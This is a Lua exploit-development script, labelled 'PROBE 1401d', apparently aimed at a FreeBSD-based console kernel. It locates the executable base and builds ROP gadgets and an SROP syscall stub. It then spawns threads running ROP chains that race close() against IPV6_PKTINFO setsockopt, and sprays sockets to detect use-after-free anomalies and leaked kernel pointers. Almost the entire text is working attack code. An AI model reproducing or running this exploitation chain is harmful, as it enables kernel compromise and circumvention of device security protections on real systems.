-- CRASH_CLASS: HIGH
-- PROBE 1401d: IPv6 pktopts close/setsockopt race
--
-- prior art: 1403d proven child thread pattern (memory.alloc stack, wd/wq2 writes),
--   1400a setsockopt(PKTINFO,ifindex=0)=0 baseline confirmed,
--   1401c hung because mmap stack + safe_wq chain was broken
--
-- Uses 1403d's verified child launch: memory.alloc stack, wq2 helper,
-- poll for completion marker via write(socketpair_fd, marker, 8).

print("=== PROBE 1401d: IPv6 PKTOPTS RACE (proven pattern) ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) memory.write_dword(a, v) end
local function wq2(addr, hi, lo)
    wd(addr, lo)
    wd(addr + 4, hi)
end
local function get_hi_lo(v)
    if type(v) == "table" and v.h then return v.h, v.l end
    return 0, N(v)
end
local function add_off(hi, lo, off)
    lo = lo + off
    if lo >= 0x100000000 then hi = hi + 1; lo = lo - 0x100000000 end
    return hi, lo
end

-- Syscalls
local sc_socket     = mk(97)
local sc_close      = mk(6)
local sc_setsockopt = mk(105)
local sc_getsockopt = mk(118)
local sc_socketpair = mk(135)
local sc_read       = mk(3)
local sc_nanosleep  = mk(240)

local AF_INET6 = 28
local SOCK_DGRAM = 2
local IPPROTO_IPV6 = 41
local IPV6_PKTINFO = 46
local IPPROTO_UDP = 17

-- Get eboot
local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local eb_lo = rd(N(info) + 0x108) or 0
local eb_hi = rd(N(info) + 0x10C) or 0
print(string.format("eboot=0x%X%08X", eb_hi, eb_lo))

-- Gadgets
local g = {}
local function gadget(name, off)
    local hi, lo = add_off(eb_hi, eb_lo, off)
    g[name] = {hi, lo}
end
gadget("pop_rax", 0x992)
gadget("pop_rdi", 0xC9DFE)
gadget("pop_rsi", 0xD77D)
gadget("pop_rdx", 0x3B02D7)
gadget("pop_rcx", 0xE64)
gadget("pop_r8",  0x991)
gadget("mov_w",   0x92C67)
gadget("ret",     0x42)

-- Get syscall stub via getcontext (1403d pattern)
print("")
print("--- syscall addr via getcontext ---")
local ctx = memory.alloc(0x500)
pcall(function() return mk(421)(uint64(N(ctx))) end)
local brip = rq(N(ctx) + 0x40 + 0xA0)
if not brip then print("FAIL: no RIP from getcontext"); return end
local sc_hi, sc_lo = get_hi_lo(brip)
sc_lo = sc_lo - 2
if sc_lo < 0 then sc_hi = sc_hi - 1; sc_lo = sc_lo + 0x100000000 end
print(string.format("syscall_addr=0x%X%08X", sc_hi, sc_lo))

-- Verify via SROP getpid
pcall(function() return mk(421)(uint64(N(ctx))) end)
wd(N(ctx) + 0x40 + 0xA0, sc_lo); wd(N(ctx) + 0x40 + 0xA0 + 4, sc_hi)
wd(N(ctx) + 0x40 + 0x38, 20); wd(N(ctx) + 0x40 + 0x38 + 4, 0) -- RAX=20 (getpid)
local ok_sr, rv_sr = pcall(function() return mk(417)(uint64(N(ctx))) end)
if ok_sr and rv_sr then
    print("srop_getpid=" .. N(rv_sr))
else
    print("SROP verify FAIL"); return
end

-- Shared: Fake TCB
local tcb = memory.alloc(0x1000)
local tcb_n = N(tcb)
local tcb_hi, tcb_lo = get_hi_lo(tcb)
for i = 0, 0x1000 - 4, 4 do
    wd(tcb_n + i, (i % 8 == 0) and tcb_lo or tcb_hi)
end
local tcb_ptr = memory.alloc(8)
wq2(N(tcb_ptr), tcb_hi, tcb_lo)
local tp_hi, tp_lo = get_hi_lo(tcb_ptr)

-- fn_addr stub for comparison
local stub = N(syscall.pipe.fn_addr)
print(string.format("fn_addr=0x%X", stub))
local stub_hi, stub_lo = math.floor(stub / 0x100000000), stub % 0x100000000

-- Use fn_addr as the syscall stub (proven in 396f, 384b)
-- Or use the SROP-derived syscall address
-- The child chain needs: pop rax -> num, then call to syscall instruction
-- With fn_addr, the pattern is: pop_rax -> num -> fn_addr (it does syscall internally)
-- With raw syscall addr (sc_hi:sc_lo), we need: pop_rax -> num -> call [syscall;ret]
-- fn_addr IS the stub that does the syscall for us, so use that

-- ============================================================
-- Phase 0: Test child with proven pattern
-- ============================================================
print("")
print("--- Phase 0: child test ---")

local STACK_SZ = 0x10000  -- 64KB
local CHAIN_BASE = 0xF000 -- chain starts well into the stack

local function launch_child(chain)
    local stk = memory.alloc(STACK_SZ)
    local stk_n = N(stk)
    for i = 0, STACK_SZ - 4, 4 do wd(stk_n + i, 0) end

    local rsp = stk_n + CHAIN_BASE
    rsp = (math.floor(rsp / 16) * 16) - 8

    for i, entry in ipairs(chain) do
        local off = (i - 1) * 8
        wd(rsp + off, entry[2])
        wd(rsp + off + 4, entry[1])
    end

    local param = memory.alloc(0x40)
    local pn = N(param)
    wq2(pn + 0x00, g.pop_rax[1], g.pop_rax[2])  -- start_func
    wq2(pn + 0x08, 0, 0)                          -- arg
    wq2(pn + 0x10, get_hi_lo(stk))               -- stack_base
    wq2(pn + 0x18, 0, CHAIN_BASE)                -- stack_size
    wq2(pn + 0x20, 0, 0)                          -- tls_base
    wq2(pn + 0x28, 0, 0)                          -- tls_size
    local ctid = memory.alloc(8)
    wq2(pn + 0x30, get_hi_lo(ctid))              -- child_tid

    local ok_t, rv_t = pcall(function()
        return mk(455)(uint64(pn), uint64(0x38))
    end)
    if not ok_t then return -1 end
    return N(rv_t)
end

-- Test: sysarch + write marker to socketpair + thr_exit
local sp_buf = memory.alloc(16)
local sp_ret = N(sc_socketpair(uint64(1), uint64(SOCK_DGRAM), uint64(0), uint64(sp_buf)))
local sp_r = rd(N(sp_buf)) or -1
local sp_w = rd(N(sp_buf) + 4) or -1
print(string.format("socketpair=%d fds=%d,%d", sp_ret, sp_r, sp_w))

local marker = memory.alloc(16)
wq2(N(marker), 0xCAFEBABE, 0x12345678)

local marker_hi, marker_lo = get_hi_lo(marker)
local chain_test = {
    -- sysarch(129, &tcb_ptr)
    g.pop_rdi, {0, 129},
    g.pop_rsi, {tp_hi, tp_lo},
    g.pop_rax, {0, 165},
    {stub_hi, stub_lo},
    -- write(sp_w, marker, 8)
    g.pop_rdi, {0, sp_w},
    g.pop_rsi, {marker_hi, marker_lo},
    g.pop_rdx, {0, 8},
    g.pop_rax, {0, 4},
    {stub_hi, stub_lo},
    -- thr_exit(0)
    g.pop_rdi, {0, 0},
    g.pop_rax, {0, 431},
    {stub_hi, stub_lo},
}

local tr = launch_child(chain_test)
print(string.format("thr_new=%d", tr))

-- Wait and read
local slp = memory.alloc(16)
wq2(N(slp), 0, 0); wd(N(slp) + 8, 50000000) -- 50ms
sc_nanosleep(uint64(N(slp)), uint64(0))

local rbuf = memory.alloc(16)
wq2(N(rbuf), 0, 0)
local rr = N(sc_read(uint64(sp_r), uint64(N(rbuf)), uint64(8)))
local rh, rl = get_hi_lo(rq(N(rbuf)))
print(string.format("read=%d data=0x%X%08X", rr, rh, rl))

if rh == 0xCAFEBABE and rl == 0x12345678 then
    print("CHILD OK!")
else
    print("CHILD FAILED — stopping")
    sc_close(uint64(sp_r)); sc_close(uint64(sp_w))
    return
end
sc_close(uint64(sp_r)); sc_close(uint64(sp_w))

-- ============================================================
-- Phase 1: PKTINFO baseline
-- ============================================================
print("")
print("--- Phase 1: PKTINFO baseline ---")
local tfd = N(sc_socket(uint64(AF_INET6), uint64(SOCK_DGRAM), uint64(IPPROTO_UDP)))
local pkt = memory.alloc(32)
wq2(N(pkt), 0, 0); wq2(N(pkt) + 8, 0, 0); wd(N(pkt) + 16, 0)
local r = N(sc_setsockopt(uint64(tfd), uint64(IPPROTO_IPV6), uint64(IPV6_PKTINFO), uint64(N(pkt)), uint64(20)))
print(string.format("setsockopt(PKTINFO)=%d", r))
sc_close(uint64(tfd))
if r ~= 0 then print("PKTINFO FAIL"); return end

-- ============================================================
-- Phase 2: Close/setsockopt race
-- ============================================================
print("")
print("--- Phase 2: race ---")

local ROUNDS = 10
local CLOSE_REPS = 80  -- close(fd) x80 in child A
local SETOPT_REPS = 80 -- setsockopt(fd) x80 in child B
local SPRAY = 30
local anomalies = 0

local pkt_n = N(pkt)

for round = 1, ROUNDS do
    -- Create target IPv6 socket
    local fd = N(sc_socket(uint64(AF_INET6), uint64(SOCK_DGRAM), uint64(IPPROTO_UDP)))
    if fd < 0 then print(string.format("[R%d] socket fail", round)); break end

    -- Set PKTINFO on it
    wq2(pkt_n, 0, 0); wq2(pkt_n + 8, 0, 0); wd(pkt_n + 16, 0)
    sc_setsockopt(uint64(fd), uint64(IPPROTO_IPV6), uint64(IPV6_PKTINFO), uint64(pkt_n), uint64(20))

    -- Build child A: sysarch + close(fd) x CLOSE_REPS + thr_exit
    local chain_a = {
        g.pop_rdi, {0, 129}, g.pop_rsi, {tp_hi, tp_lo}, g.pop_rax, {0, 165}, {stub_hi, stub_lo},
    }
    for i = 1, CLOSE_REPS do
        chain_a[#chain_a+1] = g.pop_rdi; chain_a[#chain_a+1] = {0, fd}
        chain_a[#chain_a+1] = g.pop_rax; chain_a[#chain_a+1] = {0, 6}
        chain_a[#chain_a+1] = {stub_hi, stub_lo}
    end
    chain_a[#chain_a+1] = g.pop_rdi; chain_a[#chain_a+1] = {0, 0}
    chain_a[#chain_a+1] = g.pop_rax; chain_a[#chain_a+1] = {0, 431}
    chain_a[#chain_a+1] = {stub_hi, stub_lo}

    -- Build child B: sysarch + setsockopt(fd, IPV6_PKTINFO, pkt, 20) x SETOPT_REPS + thr_exit
    local opt_buf = memory.alloc(32)
    wq2(N(opt_buf), 0, 0); wq2(N(opt_buf) + 8, 0, 0); wd(N(opt_buf) + 16, 0)
    local ob_hi, ob_lo = get_hi_lo(opt_buf)

    local chain_b = {
        g.pop_rdi, {0, 129}, g.pop_rsi, {tp_hi, tp_lo}, g.pop_rax, {0, 165}, {stub_hi, stub_lo},
    }
    for i = 1, SETOPT_REPS do
        chain_b[#chain_b+1] = g.pop_rdi; chain_b[#chain_b+1] = {0, fd}
        chain_b[#chain_b+1] = g.pop_rsi; chain_b[#chain_b+1] = {0, IPPROTO_IPV6}
        chain_b[#chain_b+1] = g.pop_rdx; chain_b[#chain_b+1] = {0, IPV6_PKTINFO}
        chain_b[#chain_b+1] = g.pop_rcx; chain_b[#chain_b+1] = {ob_hi, ob_lo}
        chain_b[#chain_b+1] = g.pop_r8;  chain_b[#chain_b+1] = {0, 20}
        chain_b[#chain_b+1] = g.pop_rax; chain_b[#chain_b+1] = {0, 105}
        chain_b[#chain_b+1] = {stub_hi, stub_lo}
    end
    chain_b[#chain_b+1] = g.pop_rdi; chain_b[#chain_b+1] = {0, 0}
    chain_b[#chain_b+1] = g.pop_rax; chain_b[#chain_b+1] = {0, 431}
    chain_b[#chain_b+1] = {stub_hi, stub_lo}

    -- Check chain sizes fit in stack
    local a_entries = #chain_a
    local b_entries = #chain_b
    if round == 1 then
        print(string.format("chain_a=%d entries (%d bytes), chain_b=%d entries (%d bytes)",
            a_entries, a_entries * 8, b_entries, b_entries * 8))
        if a_entries * 8 > CHAIN_BASE or b_entries * 8 > CHAIN_BASE then
            print("CHAIN TOO LARGE"); return
        end
    end

    -- Launch both
    local ra = launch_child(chain_a)
    local rb = launch_child(chain_b)

    -- Immediately spray new IPv6 sockets
    local spray_fds = {}
    for i = 1, SPRAY do
        local sfd = N(sc_socket(uint64(AF_INET6), uint64(SOCK_DGRAM), uint64(IPPROTO_UDP)))
        if sfd >= 0 then
            wq2(pkt_n, 0, 0); wq2(pkt_n + 8, 0, 0); wd(pkt_n + 16, 0)
            sc_setsockopt(uint64(sfd), uint64(IPPROTO_IPV6), uint64(IPV6_PKTINFO), uint64(pkt_n), uint64(20))
            spray_fds[#spray_fds+1] = sfd
        end
    end

    -- Wait for children
    wq2(N(slp), 0, 0); wd(N(slp) + 8, 100000000)  -- 100ms
    sc_nanosleep(uint64(N(slp)), uint64(0))

    -- Check spray sockets for anomalies
    for i, sfd in ipairs(spray_fds) do
        local out = memory.alloc(32)
        wq2(N(out), 0xDEADDEAD, 0xDEADDEAD)
        wq2(N(out)+8, 0xDEADDEAD, 0xDEADDEAD)
        wq2(N(out)+16, 0xDEADDEAD, 0xDEADDEAD)
        local olen = memory.alloc(8)
        wd(N(olen), 24)
        local gr = N(sc_getsockopt(uint64(sfd), uint64(IPPROTO_IPV6),
            uint64(IPV6_PKTINFO), uint64(N(out)), uint64(N(olen))))
        if gr == 0 then
            local q1h, q1l = get_hi_lo(rq(N(out)) or uint64(0))
            local q2h, q2l = get_hi_lo(rq(N(out) + 8) or uint64(0))
            local d5 = rd(N(out) + 16) or 0
            if q1l ~= 0 or q1h ~= 0 or q2l ~= 0 or q2h ~= 0 or d5 ~= 0 then
                anomalies = anomalies + 1
                print(string.format("[R%d] ANOMALY fd=%d: 0x%X%08X 0x%X%08X ifidx=0x%X",
                    round, sfd, q1h, q1l, q2h, q2l, d5))
                if q1h >= 0xFFFF8000 or q2h >= 0xFFFF8000 then
                    print("  *** KERNEL POINTER ***")
                end
            end
        end
    end

    -- Cleanup
    for _, sfd in ipairs(spray_fds) do sc_close(uint64(sfd)) end

    if round <= 3 or round % 5 == 0 then
        print(string.format("[R%d] thr=%d/%d spray=%d anom=%d", round, ra, rb, #spray_fds, anomalies))
    end
end

print("")
print(string.format("=== RESULTS: %d rounds, %d anomalies ===", ROUNDS, anomalies))
if anomalies > 0 then
    print("*** PKTOPTS ANOMALY ***")
else
    print("Clean. Race window may be too small or close() frees socket before pktopts.")
end
print("=== PROBE 1401d COMPLETE ===")
